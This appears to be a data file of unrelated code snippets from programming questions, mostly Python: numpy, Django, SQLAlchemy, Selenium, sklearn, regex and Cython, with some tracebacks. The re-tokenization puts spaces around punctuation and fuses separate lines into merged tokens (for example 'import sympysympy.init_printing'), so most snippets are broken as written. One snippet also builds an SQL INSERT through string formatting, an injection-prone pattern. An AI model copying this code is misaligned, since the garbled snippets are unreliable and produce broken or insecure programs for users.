filelines = [ ] r = re.compile ( ' ( `` .* ? '' ) ' ) for line in f : m = r.split ( line ) nline = `` for token in m : if token.find ( ' # ' ) ! = -1 and token [ 0 ] ! = ' '' ' : nline += token [ : token.find ( ' # ' ) ] break else : nline += token filelines.append ( nline ) ' `` Phone # '' : '' 555-1234 '' ' - > ' `` Phone # '' : '' 555-1234 '' `` `` Phone `` # : '' 555-1234 '' ' - > ' `` Phone `` '' # '' Phone # '' : '' 555-1234 '' ' - > `` ' `` Phone # '' : '' 555-1234 '' # Comment ' - > ' `` Phone # '' : '' 555-1234 '' ' filelines = [ ] r = re.compile ( ' ( ? : '' [ ^ '' ] * '' | [ ^ '' # ] ) * ( # ) ' ) for line in f : m = r.match ( line ) if m ! = None : filelines.append ( line [ : m.start ( 1 ) ] ) else : filelines.append ( line ) filelines = [ ] r = re.compile ( r ' ( ? : '' ( ? : [ ^ '' \\ ] |\\ . ) * '' | [ ^ '' # ] ) * ( # | $ ) ' ) for line in f : m = r.match ( line ) filelines.append ( line [ : m.start ( 1 ) ] )
"x = [ `` abc '' , `` defgh '' , `` ij '' ] ( x [ 4 ] == `` e '' ) is True x = [ ( 0 , `` abc '' ) , ( 3 , `` defgh '' ) , ( 8 , `` ij '' ) ] > > > x = [ `` abc '' , `` defgh '' , `` ij '' ] > > > x [ 2:10 ] = `` 12345678 '' > > > x [ `` ab '' , `` 12345678 '' , `` j '' ]"
"import sympysympy.init_printing ( use_latex='mathjax ' ) x , y = sympy.symbols ( `` x , y '' , real=True , positive=True ) sympy.simplify ( sqrt ( 2*x/y ) )"
"tracks.sort ( key=lambda tup : tup [ 0 ] ) i = 0for trackList in generatePlaylists ( tracks,10 ) : i += 1 playlistname = str ( i ) p = { 'name ' : playlistname } playlist = iTunes.classForScriptingClass_ ( `` playlist '' ) .alloc ( ) .initWithProperties_ ( p ) iTunes.sources ( ) [ 0 ] .playlists ( ) .insertObject_atIndex_ ( playlist , 0 ) # Find the playlist I just made for playlist in iTunes.sources ( ) [ 0 ] .playlists ( ) : if playlist.name ( ) == playlistname : newPlaylist = playlist # Add the tracks to it for track in trackList : print track [ 1 ] .name ( ) iTunes.add_to_ ( track [ 1 ] , newPlaylist )"
"@ singletonclass Registry ( object ) : def __init__ ( self ) : self.objects = { } class MyObject ( object ) : def __init__ ( self , object_name ) : self.object_name = object_name Registry ( ) .objects [ self.object_name ] = self from myobjectmodule import MyObjectA = MyObject ( 'Foo ' ) from myobjectmodule import Registryregistry = Registry ( ) foo = registry.objects [ 'Foo ' ]"
"> > > x = np.array ( [ [ 'a0 ' , 'a1 ' ] , [ 'b0 ' , 'b1 ' ] ] ) > > > y = np.array ( [ [ 'x0 ' , 'x1 ' ] , [ 'y0 ' , 'y1 ' ] ] ) > > > iterable = [ np.outer ( x [ i ] , y [ i ] ) for i in xrange ( x.shape [ 0 ] ) ] > > > elbareti = np.asarray ( iterable ) > > > elbaretiarray ( [ [ [ 'a0'*'x0 ' , 'a0'*'x1 ' ] , [ 'a1'*'x0 ' , 'a1'*'x1 ' ] ] , [ [ 'b0'*'y0 ' , 'b0'*'y1 ' ] , [ 'b1'*'y0 ' , 'b1'*'y1 ' ] ] ] )"
"FanSpeed.FAN_SPEED_1FanSpeed.FAN_SPEED_2FanSpeed.FAN_SPEED_3FanSpeed.FAN_SPEED_4FanSpeed.FAN_SPEED_5FanSpeed.FAN_SPEED_6FanSpeed.FAN_SPEED_7FanSpeed.FAN_SPEED_8FanSpeed.FAN_SPEED_9FanSpeed.FAN_SPEED_10 fan.set_configuration ( fan_mode=FanMode.FAN , fan_speed=FanSpeed.FAN_SPEED_5 )"
"import numpy as npnum = 2048threshold = 0.5with open ( file , 'rb ' ) as f : arr = np.fromfile ( f , dtype=np.float32 , count=num**3 ) arr *= thresholdarr = np.where ( arr > = 1.0 , 1.0 , arr ) vol_avg = np.sum ( arr ) / ( num**3 ) # both arr and vol_avg needed later"
"try : x = d [ i ] except KeyError : x = ' ? ' x = get ( d [ i ] , ' ? ' )"
"class Meta ( type ) : def __new__ ( cls , name , bases , newattrs ) : do_what_you_want_before ( ) result= super ( Meta , cls ) .__new__ ( cls , name , bases , newattrs ) do_what_you_want_after ( ) return resultclass Foo : __metaclass__ = Metaclass SubFoo ( Foo ) : pass TypeError : Error when calling the metaclass bases metaclass conflict : the metaclass of a derived class must be a ( non-strict ) subclass of the metaclasses of all its bases"
$ /cygdrive/c/pydir/python.exe -i $ /cygdrive/c/pydir/ipython.exe $ /cygdrive/c/pydir/python.exe -i /cygdrive/c/pydir/ipython-script.py
[ buildout ] parts = foofind-links = http : //github.com/me/themodule/tarball/version # egg=themodule-versionversions = versionseggs = ... [ versions ] themodule=version [ foo ] eggs = $ { buildout : eggs } themodule
from __future__ import divisionpi = 0l = 1x = Truewhile True : if x : pi += 4/l else : pi -= 4/l x = not x l += 2 print str ( pi ) cdef float pi = 0.0cdef float l = 1.0cdef unsigned short x = Truewhile True : if x : pi += 4.0/l else : pi -= 4.0/l x = not x l += 2 print str ( pi )
_ ( ' [ OPTION ] [ QUEUE ] ' )
"myDic = [ { 2:1 , 3:1 , 5:2 } , { 3:4 , 6:4 , 2:3 } , { 2:5 , 3:6 } , ... ] commonkey = [ { 2:1 , 3:1 } , { 2:3 , 3:4 } , { 2:5 , 3:6 } ] finalDic= { 3:11 , 2,9 } import collectionsmyDic = [ { 2:1 , 3:1 , 5:2 } , { 3:4 , 6:4 , 2:3 } , { 2:5 , 3:6 } ] def commonKey ( x ) : i=0 allKeys = [ ] while i < len ( x ) : for key in x [ 0 ] .keys ( ) : allKeys.append ( key ) i=i+1 commonKeys = collections.Counter ( allKeys ) commonKeys = [ i for i in commonKeys if commonKeys [ i ] > len ( x ) -1 ] return commonKeysprint commonKey ( myDic )"
"rng = np.arange ( 2,51 ) box = pd.DataFrame ( index = rng , columns = rng ) for x in range ( 2 , len ( box ) +2 ) : for y in range ( 2 , len ( box ) +2 ) : box [ x ] [ y ] = x*ybox"
"def is_associative_cayley_table ( table ) : if not is_cayley_table ( table ) : return False for i in range ( 0 , len ( table ) ) : for j in range ( 0 , len ( table ) ) : for k in range ( 0 , len ( table ) ) : if ( table [ table [ i ] [ j ] ) ] [ k ] ) == ( table [ i ] [ ( table [ j ] [ k ] ) ] ) : print ( `` Okay '' ) else return False"
set newtext [ string map `` { \r } { } { \n\n } { \n\n } { \n\t } { \n\t } { \n } { } '' $ oldtext ]
"def foo ( ) : x = 2 y = 2 return ( x+y ) def foo ( ) : x = 2 y = 2 return ( x+y ) , ( x-y )"
except ValueError as e :
"p = figure ( tools = TOOLS , x_axis_label ... ) p.line ( ... . ) script , div = components ( p ) render_template ( .html , script = script , div =div ) slider = Slider ( start=0 , end=10 , value=1 , step=.1 , title= '' Stuff '' )"
"W = x [ : ,1 ] * y [ : ,1 ] .T + x [ : ,2 ] * y [ : ,2 ] .T + ... c = sparse.csc_matrix ( ( n , n ) ) for i in xrange ( 0 , m ) : tmp = bam.id2sym_thal [ : ,i ] * bam.id2sym_cort [ : ,i ] .T minimum ( tmp.data , ones_like ( tmp.data ) , tmp.data ) maximum ( tmp.data , ones_like ( tmp.data ) , tmp.data ) c = c + tmp"
"# Test values : values = [ np.array ( [ 10 , 11 , 10 , 11 , 10 , 11 , 10 ] ) , np.array ( [ 21 , 21 , 22 , 22 , 21 , 22 , 23 ] ) , ] # Expected outcome : np.array ( [ 0 , 1 , 2 , 3 , 0 , 3 , 4 ] ) # * * import numpy as npdef groupify ( values ) : group = np.zeros ( ( len ( values [ 0 ] ) , ) , dtype=np.int64 ) - 1 # Magic number : -1 means ungrouped . group_meanings = { } next_hash = 0 matching = np.ones ( ( len ( values [ 0 ] ) , ) , dtype=bool ) while any ( group == -1 ) : this_combo = { } matching [ : ] = ( group == -1 ) first_ungrouped_idx = np.where ( matching ) [ 0 ] [ 0 ] for curr_id , value_array in enumerate ( values ) : needed_value = value_array [ first_ungrouped_idx ] matching [ matching ] = value_array [ matching ] == needed_value this_combo [ curr_id ] = needed_value # Assign all of the found elements to a new group group [ matching ] = next_hash group_meanings [ next_hash ] = this_combo next_hash += 1 return group , group_meanings"
"from django.db import modelsclass BaseInfoQuerySet ( models.query.QuerySet ) : def public ( self ) : return self.filter ( public=True ) def not_grouped ( self ) : return self.filter ( bu_group=True ) class BUManager ( models.Manager ) : def get_queryset ( self ) : return BaseInfoQuerySet ( self.model , using=self._db ) .extra ( select= { 'null_group ' : 'bu_group_id IS NULL ' } , order_by= [ 'null_group ' ] ) class BU ( models.Model ) : # some field definitions # option 1 ( preferred ) objects = BaseInfoQuerySet.as_manager ( ) # option 2 objects = BUManager ( )"
"temp = np.asarray ( [ 10 , 9.6 , 9.3 , ... , -20.3 , -21.0 ] ) # Temperature in celsiusheight = np.asarray ( [ 129 , 145 , 167 , ... , 5043 , 5112 ] ) # Height in meters regular_heights = np.arange ( 0 , 6000 , 100 ) # Regular heights every 100mregular_temps = [ ] for i in range ( len ( regular_heights ) -1 ) : mask = np.logical_and ( height > regular_heights [ i ] , height < regular_heights [ i+1 ] ) mean = np.mean ( temp [ mask ] ) regular_temps.append ( mean ) regular_temps = np.hstack ( ( regular_temps ) )"
{ { message } }
"import matplotlib.pyplot as pltimport numpy as npimg_path = '/path/to/image.tif'img = plt.imread ( img_path ) plt.imshow ( img , cmap = 'gray ' )"
"from sklearn.cross_validation import StratifiedKFoldfrom sklearn.feature_selection import RFECVfrom sklearn import svm , grid_searchdef get_best_feats ( data , labels , c_values ) : parameters = { ' C ' : c_values } # svm1 passed to clf which is used to grid search the best parameters svm1 = SVC ( kernel='linear ' ) clf = grid_search.GridSearchCV ( svm1 , parameters , refit=True ) clf.fit ( data , labels ) # print 'best gamma ' , clf.best_params_ [ 'gamma ' ] # svm2 uses the optimal hyperparameters from svm1 svm2 = svm.SVC ( C=clf.best_params_ [ ' C ' ] , kernel='linear ' ) # svm2 is then passed to RFECVv as the estimator for recursive feature elimination rfecv = RFECV ( estimator=svm2 , step=1 , cv=StratifiedKFold ( labels , 5 ) ) rfecv.fit ( data , labels ) print `` support : '' , rfecv.support_ return data [ : ,rfecv.support_ ] def get_best_feats2 ( data , labels , c_values ) : parameters = { ' C ' : c_values svm1 = SVC ( kernel='linear ' ) rfecv = RFECV ( estimator=svm1 , step=1 , cv=StratifiedKFold ( labels , 5 ) , estimator_params=parameters ) rfecv.fit ( data , labels ) print `` Kept { } out of { } features '' .format ( ( data [ : ,rfecv.support_ ] ) .shape [ 1 ] , data.shape [ 1 ] ) print `` support : '' , rfecv.support_ return data [ : ,rfecv.support_ ] X , y = get_heart_data ( ) c_values = [ 0.1,1.,10 . ] get_best_feats2 ( X , y , c_values ) max_iter=self.max_iter , random_seed=random_seed ) File `` libsvm.pyx '' , line 59 , in sklearn.svm.libsvm.fit ( sklearn/svm /libsvm.c:1674 ) TypeError : a float is required"
"sql = text ( 'SELECT t1 . * , t2 . * FROM table1 t1 ' 'LEFT JOIN table2 t2 ON t1.id=t2.table1_id ' ) query = db.session.query ( Table1 , Table2 ) .from_statement ( sql ) .params ( ) table1_table2_tuple_list = query.all ( ) 67 , 'some name ' , 1 , 'some name in table 2 ' , 67 67 , 'some name ' , Null , Null , Null sql = text ( 'SELECT t1 . * , t2.id , t2.name , t1.id FROM table1 t1 ' 'LEFT JOIN table2 t2 ON t1.id=t2.table1_id ' ) query = db.session.query ( Table1 , Table2 , Table1.id ) .from_statement ( sql ) .params ( ) table1_table2_tuple_list = query.all ( ) [ < Table1 > , < Table2 > , 1 ] [ ( < Table1 > , None ) ]"
"from multiprocessing.managers import BaseManagerclass UploadClass ( object ) : def upload ( self , filePath , params , destUrl ) : # do stuff return resultsclass MyManager ( BaseManager ) : passMyManager.register ( 'uploads ' , UploadClass ) if __name__ == '__main__ ' : manager = MyManager ( ) manager.start ( ) upload = manager.uploads ( ) # do this wait for completion or do they perform this async print upload.upload ( r '' < path > '' , { ... } , `` some url '' ) print upload.upload ( r '' < path > '' , { ... } , `` some url '' )"
"array ( [ [ 0 , 1 , 1 , 0 , 0 , 0 , 0 ] , [ 1 , 0 , 1 , 0 , 0 , 0 , 0 ] , [ 1 , 1 , 0 , 0 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 0 , 1 , 0 , 1 ] , [ 0 , 0 , 0 , 1 , 0 , 1 , 0 ] , [ 0 , 0 , 0 , 0 , 1 , 0 , 1 ] , [ 0 , 0 , 0 , 1 , 0 , 1 , 0 ] ] ) from scipy.sparse import csr_matrixfrom scipy.sparse.csgraph import depth_first_orderimport numpy as nptest = np.asarray ( [ [ 0 , 1 , 1 , 0 , 0 , 0 , 0 ] , [ 1 , 0 , 1 , 0 , 0 , 0 , 0 ] , [ 1 , 1 , 0 , 0 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 0 , 1 , 0 , 1 ] , [ 0 , 0 , 0 , 1 , 0 , 1 , 0 ] , [ 0 , 0 , 0 , 0 , 1 , 0 , 1 ] , [ 0 , 0 , 0 , 1 , 0 , 1 , 0 ] ] ) graph = csr_matrix ( test ) result = depth_first_order ( graph , 0 ) > > > result ( array ( [ 0 , 1 , 2 ] ) , array ( [ -9999 , 0 , 1 , -9999 , -9999 , -9999 , -9999 ] ) )"
"set_of_keys = { 'val1 ' , 'val2 ' , 'val3 ' } dict_to_compare = { 'k1 ' : 'val1 ' , 'k2 ' : 'val2 ' , 'k3 ' : 'val6 ' } list_of_dict = [ { 'k1 ' : 'val1 ' , 'k2 ' : 'val2 ' , 'k3 ' : 'val3 ' } , { 'k1 ' : 'val4 ' , 'k2 ' : 'val5 ' , 'k3 ' : 'val6 ' } , { 'k1 ' : 'val7 ' , 'k2 ' : 'val8 ' , 'k3 ' : 'val9 ' } ] out = [ { 'k1 ' : 'val1 ' , 'k2 ' : 'val2 ' , 'k3 ' : 'val3 ' } ] # First element from list"
RuntimeError : maximum recursion depth exceeded
"[ { 'type_id ' : 6 , 'type_name ' : 'Type 1 ' } , { 'type_id ' : 12 , 'type_name ' : 'Type 2 ' } ] [ { 'type ' : 6 , 'name ' : 'Type 1 ' } , { 'type ' : 12 , 'name ' : 'Type 2 ' } ]"
"> > > import sslTraceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` C : \Users\username_redacted\Anaconda2\lib\ssl.py '' , line 133 , in < module > PROTOCOL_SSLv23 = PROTOCOL_TLSNameError : name 'PROTOCOL_TLS ' is not defined"
"keys = [ 'name ' , 'age ' ] values = [ 'Monty ' , 42 , 'Matt ' , 28 , 'Frank ' , 33 ] [ { 'name ' : 'Monty ' , 'age ' : 42 } , { 'name ' : 'Matt ' , 'age ' : 28 } , { 'name ' : 'Frank ' , 'age ' : 33 } ]"
"class TeacherRegistrationForm ( UserCreationForm ) : email = forms.EmailField ( required = True ) school = forms.CharField ( required = True ) subject = forms.CharField ( required = True ) head_of_subject = forms.BooleanField ( required = False ) identification_code = forms.CharField ( required = True ) def __init__ ( self , *args , **kwargs ) : super ( TeacherRegistrationForm , self ) .__init__ ( *args , **kwargs ) self.fields [ 'username ' ] .help_text = `` self.fields [ 'password2 ' ] .help_text = `` class Meta : model = User fields = ( 'username ' , 'first_name ' , 'last_name ' , 'email ' , 'school ' , 'identification_code ' , 'subject ' , 'head_of_subject ' , 'password1 ' , 'password2 ' ) def save ( self , request ) : form = TeacherRegistrationForm ( request.POST ) user = User.objects.create ( first_name=self.cleaned_data [ 'first_name ' ] , last_name=self.cleaned_data [ 'last_name ' ] , email=self.cleaned_data [ 'email ' ] , username=self.cleaned_data [ 'username ' ] , password=self.cleaned_data [ 'password1 ' ] ) teacher_profile = TeacherProfile.objects.create ( user=user , school=self.cleaned_data [ 'school ' ] , subject=self.cleaned_data [ 'subject ' ] , head_of_subject=self.cleaned_data [ 'head_of_subject ' ] , ) return user , teacher_profile if request.method == 'POST ' : form = TeacherRegistrationForm ( request.POST ) entered_school_name = form [ 'school ' ] .value ( ) entered_school_id = form [ 'identification_code ' ] .value ( ) actual_school_id = SchoolProfile.objects.get ( school_name__exact = entered_school_name ) .identification_code if form.is_valid ( ) and ( entered_school_id == actual_school_id ) : user , teacher_profile = form.save ( request ) return render ( request , 'accounts/home.html ' ) else : args = { 'form ' : form } return render ( request , 'accounts/reg_form.html ' , args )"
"ASX listed companies as at Mon May 16 17:01:04 EST 2016 Company name ASX code GICS industry group1-PAGE LIMITED 1PG Software & Services1300 SMILES LIMITED ONT Health Care Equipment & Services1ST AVAILABLE LTD 1ST Health Care Equipment & Services import csvimport urllib.requestfrom itertools import islicelocal_filename = `` C : \\myfile.csv '' url = ( 'http : //mysite/afile.csv ' ) temp_filename , headers = urllib.request.urlretrieve ( url ) with open ( temp_filename , ' r ' , newline= '' ) as inf , \ open ( local_filename , ' w ' , newline= '' ) as outf : # reader = csv.DictReader ( inf , fieldnames= ( 'ASXCode ' , 'CompanyName ' , 'GICS ' ) ) reader = csv.reader ( inf ) fieldnames = [ 'ASX code ' , 'Company name ' , 'GICS industry group ' ] writer = csv.DictWriter ( outf , fieldnames=fieldnames ) # 1 . Remove top 2 rows next ( islice ( reader , 2 , 2 ) , None ) # 2 . Reorder Columns writer.writeheader ( ) for row in csv.DictReader ( inf ) : writer.writerow ( row )"
"xarray = [ x * i / steps for i in range ( steps ) ] farray = [ f ( x ) for x in xarray ] garray = [ g ( x ) for x in xarray ] f ( x ) = exp ( -x ) g ( x ) = 2 * exp ( -2 * x ) import numpy as npimport scipy.signal as signalimport matplotlib.pyplot as pltimport mathdef convolveoriginal ( x , y ) : `` ' The original algorithm from http : //www.physics.rutgers.edu/~masud/computing/WPark_recipes_in_python.html. `` ' P , Q , N = len ( x ) , len ( y ) , len ( x ) + len ( y ) - 1 z = [ ] for k in range ( N ) : t , lower , upper = 0 , max ( 0 , k - ( Q - 1 ) ) , min ( P - 1 , k ) for i in range ( lower , upper + 1 ) : t = t + x [ i ] * y [ k - i ] z.append ( t ) return np.array ( z ) # Modified to include conversion to numpy arraydef convolve ( y1 , y2 , dx = None ) : `` ' Compute the finite convolution of two signals of equal length . @ param y1 : First signal . @ param y2 : Second signal . @ param dx : [ optional ] Integration step width . @ note : Based on the algorithm at http : //www.physics.rutgers.edu/~masud/computing/WPark_recipes_in_python.html. `` ' P = len ( y1 ) # Determine the length of the signal z = [ ] # Create a list of convolution values for k in range ( P ) : t = 0 lower = max ( 0 , k - ( P - 1 ) ) upper = min ( P - 1 , k ) for i in range ( lower , upper ) : t += ( y1 [ i ] * y2 [ k - i ] + y1 [ i + 1 ] * y2 [ k - ( i + 1 ) ] ) / 2 z.append ( t ) z = np.array ( z ) # Convert to a numpy array if dx ! = None : # Is a step width specified ? z *= dx return zsteps = 50 # Number of integration stepsmaxtime = 5 # Maximum timedt = float ( maxtime ) / steps # Obtain the width of a time steptime = [ dt * i for i in range ( steps ) ] # Create an array of timesexp1 = [ math.exp ( -t ) for t in time ] # Create an array of function valuesexp2 = [ 2 * math.exp ( -2 * t ) for t in time ] # Calculate the analytical expressionanalytical = [ 2 * math.exp ( -2 * t ) * ( -1 + math.exp ( t ) ) for t in time ] # Calculate the trapezoidal convolutiontrapezoidal = convolve ( exp1 , exp2 , dt ) # Calculate the scipy convolutionsci = signal.convolve ( exp1 , exp2 , mode = 'full ' ) # Slice the first half to obtain the causal convolution and multiply by dt # to account for the step widthsci = sci [ 0 : steps ] * dt # Calculate the convolution using the original Riemann sum algorithmriemann = convolveoriginal ( exp1 , exp2 ) riemann = riemann [ 0 : steps ] * dt # Plotplt.plot ( time , analytical , label = 'analytical ' ) plt.plot ( time , trapezoidal , ' o ' , label = 'trapezoidal ' ) plt.plot ( time , riemann , ' o ' , label = 'Riemann ' ) plt.plot ( time , sci , ' . ' , label = 'scipy.signal.convolve ' ) plt.legend ( ) plt.show ( )"
"start = time.clock ( ) z = open ( 'Number.txt ' , ' r+ ' ) m = mmap.mmap ( z.fileno ( ) , 0 ) global aa = int ( m.read ( ) ) z.close ( ) end = time.clock ( ) secs = ( end - start ) print ( `` Number read in '' , '' % s '' % ( secs ) , '' seconds . `` , file=f ) print ( `` Number read in '' , '' % s '' % ( secs ) , '' seconds . `` ) f.flush ( ) del end , start , secs , z , m"
"def find_minimal_length_subarr_z ( arr , min_sum ) : found = False start = end = cur_end = cur_sum = 0 for cur_start in range ( len ( arr ) ) : if cur_end < = cur_start : cur_end , cur_sum = cur_start , arr [ cur_start ] else : cur_sum -= arr [ cur_start-1 ] # Expand while cur_sum < min_sum and cur_end < len ( arr ) -1 : cur_end += 1 cur_sum += arr [ cur_end ] # Contract while cur_end > cur_start : new_sum = cur_sum - arr [ cur_end ] if new_sum > = min_sum or new_sum > = cur_sum : cur_end -= 1 cur_sum = new_sum else : break if cur_sum > = min_sum and ( not found or cur_end-cur_start < end-start ) : start , end , found = cur_start , cur_end , True if found : return start , end [ 8 , -7 , 5 , 5 , 4 ] , 12 = > ( 2 , 4 ) [ -12 , 2 , 2 , -12 , 2 , 0 ] , 4"
"import sysclass Crawler ( object ) : def __init__ ( self , num_of_runs ) : self.run_number = 1 self.num_of_runs = num_of_runs def single_run ( self ) : # do stuff pass def run ( self ) : while self.run_number < = self.num_of_runs : self.single_run ( ) print self.run_number self.run_number += 1if __name__ == `` __main__ '' : num_of_runs = sys.argv [ 1 ] crawler = Crawler ( num_of_runs ) crawler.run ( )"
class Item ( models.Model ) : ... publish_date = models.DateTimeField ( default=datetime.datetime.now ) ... from datetime import datetimeclass ItemManager ( Manager ) : def published ( self ) : return self.get_query_set ( ) .filter ( publish_date__lte=datetime.now ( ) class ItemArchive ( ArchiveIndexView ) : queryset = Item.objects.published ( ) date_field = 'publish_date '
$ python setup.py build
"cur.execute ( 'INSERT INTO company VALUES ( % ( cname ) , % ( symbol ) , % ( start_date ) , % ( end_date ) ) ' % { 'cname ' : company , 'symbol ' : company , 'start_date ' : startdate , 'end_date ' : enddate } )"
"from selenium import webdriverfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.common.touch_actions import TouchActionsuser_agent = `` Mozilla/5.0 ( iPhone ; U ; CPU iPhone OS 3_0 like Mac OS X ; en-us ) AppleWebKit/528.18 ( KHTML , like Gecko ) Version/4.0 Mobile/7A341 Safari/528.16 '' profile = webdriver.FirefoxProfile ( ) profile.set_preference ( `` general.useragent.override '' , user_agent ) driver = webdriver.Firefox ( profile ) driver.set_window_size ( 400 , 800 ) WebDriverWait ( driver , 10 ) .until ( lambda d : d.find_element_by_css_selector ( `` .qJfNm '' ) .is_displayed ( ) ) element = driver.find_element_by_css_selector ( `` .qJfNm '' ) touchactions = TouchActions ( driver ) touchactions.tap ( element ) from selenium import webdriverfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.common.touch_actions import TouchActionsuser_agent = `` Mozilla/5.0 ( iPhone ; U ; CPU iPhone OS 3_0 like Mac OS X ; en-us ) AppleWebKit/528.18 ( KHTML , like Gecko ) Version/4.0 Mobile/7A341 Safari/528.16 '' profile = webdriver.FirefoxProfile ( ) profile.set_preference ( `` general.useragent.override '' , user_agent ) driver = webdriver.Firefox ( profile ) driver.set_window_size ( 400 , 800 ) WebDriverWait ( driver , 10 ) .until ( lambda d : d.find_element_by_css_selector ( `` .qJfNm '' ) .is_displayed ( ) ) element = driver.find_element_by_css_selector ( `` .qJfNm '' ) touchactions = TouchActions ( driver ) touchactions.tap ( element ) .perform ( ) Traceback ( most recent call last ) : File `` C : /Users/mcara/OneDrive/Desktop/instagram bot mobile/instagram_bot_mobile.py '' , line 57 , in < module > touchactions.tap ( element ) .perform ( ) File `` C : \Users\mcara\PycharmProjects\1\venv\lib\site-packages\selenium\webdriver\common\touch_actions.py '' , line 47 , in perform action ( ) File `` C : \Users\mcara\PycharmProjects\1\venv\lib\site-packages\selenium\webdriver\common\touch_actions.py '' , line 57 , in < lambda > Command.SINGLE_TAP , { 'element ' : on_element.id } ) ) File `` C : \Users\mcara\PycharmProjects\1\venv\lib\site-packages\selenium\webdriver\remote\webdriver.py '' , line 321 , in execute self.error_handler.check_response ( response ) File `` C : \Users\mcara\PycharmProjects\1\venv\lib\site-packages\selenium\webdriver\remote\errorhandler.py '' , line 242 , in check_response raise exception_class ( message , screen , stacktrace ) selenium.common.exceptions.WebDriverException : Message : POST /session/71d75201-9012-46a1-9c6e-1c720dd332ce/touch/click did not match a known command"
"import numpy as npimport cv2import mathimg = cv2.imread ( `` small.jpg '' ,0 ) img = cv2.medianBlur ( img,5 ) cimg = cv2.cvtColor ( img , cv2.COLOR_GRAY2BGR ) circles =cv2.HoughCircles ( img , cv2.HOUGH_GRADIENT,1,60 , param1=50 , param2=30 , minRadius=0 , maxRadius=0 ) circles = np.uint16 ( np.around ( circles ) ) counter=0correctC= [ ] xC= [ ] yC= [ ] for i in circles [ 0 , : ] : # cv2.circle ( cimg , ( i [ 0 ] , i [ 1 ] ) , i [ 2 ] , ( 0,255,0 ) ,2 ) # cv2.circle ( cimg , ( i [ 0 ] , i [ 1 ] ) ,2 , ( 0,0,255 ) ,2 ) cv2.putText ( cimg , str ( i [ 0 ] ) + '' , '' +str ( i [ 1 ] ) + '' , '' +str ( i [ 2 ] ) , ( i [ 0 ] , i [ 1 ] ) , cv2.FONT_HERSHEY_SIMPLEX , 0.3 , ( 255,0,0 ) ,1 , cv2.LINE_AA ) correctC.append ( ( i [ 0 ] , i [ 1 ] , i [ 2 ] ) ) xC.append ( i [ 0 ] ) yC.append ( i [ 1 ] ) counter+=1print `` Circle Count is : `` + str ( counter ) xCS=sorted ( xC ) yCS=sorted ( yC ) xS=sorted ( correctC , key=lambda correctC : correctC [ 0 ] ) q1=sorted ( xS [ :4 ] , key=lambda correctC : correctC [ 1 ] ) q2=sorted ( xS [ 4:8 ] , key=lambda correctC : correctC [ 1 ] ) q3=sorted ( xS [ 8:12 ] , key=lambda correctC : correctC [ 1 ] ) q4=sorted ( xS [ 12:16 ] , key=lambda correctC : correctC [ 1 ] ) q5=sorted ( xS [ 16:20 ] , key=lambda correctC : correctC [ 1 ] ) q6=sorted ( xS [ 20:24 ] , key=lambda correctC : correctC [ 1 ] ) q7=sorted ( xS [ 24:28 ] , key=lambda correctC : correctC [ 1 ] ) q8=sorted ( xS [ 28:32 ] , key=lambda correctC : correctC [ 1 ] ) q9=sorted ( xS [ 32 : ] , key=lambda correctC : correctC [ 1 ] ) sortedTmp= [ q1 , q2 , q3 , q4 , q5 , q6 , q7 , q8 , q9 ] sorted= [ ] for i in sortedTmp : for j in i : sorted.append ( j ) for i in range ( 36 ) : cv2.putText ( cimg , str ( i ) , ( sorted [ i ] [ 0 ] , sorted [ i ] [ 1 ] ) , cv2.FONT_HERSHEY_SIMPLEX , 1 , ( 255,0,0 ) ,3 , cv2.LINE_AA ) cv2.imshow ( 'detected circles ' , cimg ) cv2.waitKey ( 0 ) cv2.destroyAllWindows ( )"
"SELECT CUSTOMER_ID , FUND_NAME , SAVINGS_AMOUNTFROM SAVINGS_TABLEWHERE CUSTOMER_ID = 1 CUSTOMER_ID , FUND_NAME , SAVINGS_AMOUNT 1 ASSET_X 259131,72 1 ASSET_Y 718533,33 import pandas as pdimport pyodbc as poDSN = 'MY_DSN'UID = 'MY_USER'PWD = 'MY_PASSWORD'CON = po.connect ( 'DSN= { 0 } ; UID= { 1 } ; PWD= { 2 } '.format ( DSN , UID , PWD ) ) SQL = `` '' '' SELECT CUSTOMER_ID , FUND_NAME , SAVINGS_AMOUNTFROM SAVINGS_TABLEWHERE CUSTOMER_ID = 1 '' '' '' df = pd.read_sql ( SQL , CON ) dfOut [ 16 ] : CUSTOMER_ID FUND_NAME SAVINGS_AMOUNT0 1 ASSET_X 25913172.01 1 ASSET_Y 71853333.0"
"with open ( 'tmp.txt ' , ' r ' ) as f : while True : for line in f : print ( line.replace ( '\n ' , '' ) ) ad23 echo `` hi '' > > tmp.txt"
"ls some-directory/ added_tokens.json config.json merges.txt pytorch_model.bin special_tokens_map.json vocab.json from pytorch_transformers import RobertaModel # this worksmodel = RobertaModel.from_pretrained ( '/path/to/some-directory/ ' ) # this failsmodel = RobertaModel.from_pretrained ( 'gs : //my-bucket/roberta/ ' ) # ValueError : unable to parse gs : //mahmed_bucket/roberta-base as a URL or as a local path # this fails , probably due to authbucket = gcs_client.get_bucket ( 'my-bucket ' ) directory_blob = bucket.blob ( prefix='roberta ' ) model = RobertaModel.from_pretrained ( directory_blob.public_url ) # ValueError : No JSON object could be decoded # and for good measure , it also fails if I append a trailing /model = RobertaModel.from_pretrained ( directory_blob.public_url + '/ ' ) # ValueError : No JSON object could be decoded from pytorch_transformers import RobertaModelfrom google.cloud import storageimport tempfilelocal_dir = tempfile.mkdtemp ( ) gcs = storage.Client ( ) bucket = gcs.get_bucket ( bucket_name ) blobs = bucket.list_blobs ( prefix=blob_prefix ) for blob in blobs : blob.download_to_filename ( local_dir + '/ ' + os.path.basename ( blob.name ) ) model = RobertaModel.from_pretrained ( local_dir )"
def getVowels ( word ) : vowel_list = [ ] index = 0 for i in word : if i == `` a '' or i == `` e '' or i == `` i '' or i == `` o '' or i == `` u '' or i == `` A '' or i == `` E '' or i == `` I '' or i == `` O '' or i == `` U '' : vowel_list.append ( word [ index ] ) index += 1 return vowel_list
"test_string = ' ( [ 2+2 ] ) - [ 3+4 ] ) ' test_string.rfind ( ' ( ' , ' [ ' , ' { ' ) max ( test_string.rfind ( ' ( ' ) , test_string.rfind ( ' [ ' ) , test_string.rfind ( ' { ' ) )"
"$ array = array ( 1 = > 2000 , 3 = > 5000 ... ) ;"
